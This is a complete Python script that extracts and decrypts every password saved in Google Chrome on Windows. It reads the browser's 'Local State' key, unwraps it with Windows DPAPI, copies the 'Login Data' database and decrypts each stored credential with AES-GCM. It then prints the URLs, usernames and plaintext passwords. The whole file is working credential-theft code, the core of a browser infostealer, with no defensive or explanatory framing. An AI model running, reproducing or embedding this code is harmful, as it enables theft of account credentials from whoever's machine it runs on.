import os
import json
import base64
import win32crypt
import shutil
import sqlite3
from Crypto.Cipher import AES

class PasswordDecrypter():

    def __init__(self):
        self.user_data_path = os.path.join(os.getenv("USERPROFILE"), "AppData", "Local", "Google", "Chrome", "User Data")
        self.login_data_path = os.path.join(self.user_data_path, "Default", "Login Data")
        self.encryption_key = self.getEncryptionKey()

    def getEncryptionKey(self):
        local_state = open(os.path.join(self.user_data_path, "Local State"), "r").read()

        encryption_key = json.loads(local_state)["os_crypt"]["encrypted_key"]
        encryption_key = base64.b64decode(encryption_key)
        encryption_key = win32crypt.CryptUnprotectData(encryption_key[5:], None, None, None, 0)[1]

        return encryption_key

    def decryptPassword(self, ciphertext):
        initialisation_vector = ciphertext[3:15]
        encrypted_password = ciphertext[15:-16]
            
        cipher = AES.new(self.encryption_key, AES.MODE_GCM, initialisation_vector)
        decrypted_password = cipher.decrypt(encrypted_password).decode()

        return decrypted_password
    
    def main(self):
        db_name = "Loginvault.db"

        shutil.copy2(self.login_data_path, db_name)
        conn = sqlite3.connect(db_name)
        cursor = conn.cursor()

        cursor.execute("SELECT action_url, username_value, password_value FROM logins")

        login_data = []

        for login in cursor.fetchall():
            url, username, ciphertext = login
            decrypted_password = self.decryptPassword(ciphertext)
            login_data.append({
                "url": url,
                "username": username,
                "password": decrypted_password
            })

        conn.close()
        os.remove(db_name)

        return login_data

if __name__ == '__main__':
    decrypter = PasswordDecrypter()
    decrypted_login_data = decrypter.main()

    for login in decrypted_login_data:
        print(login)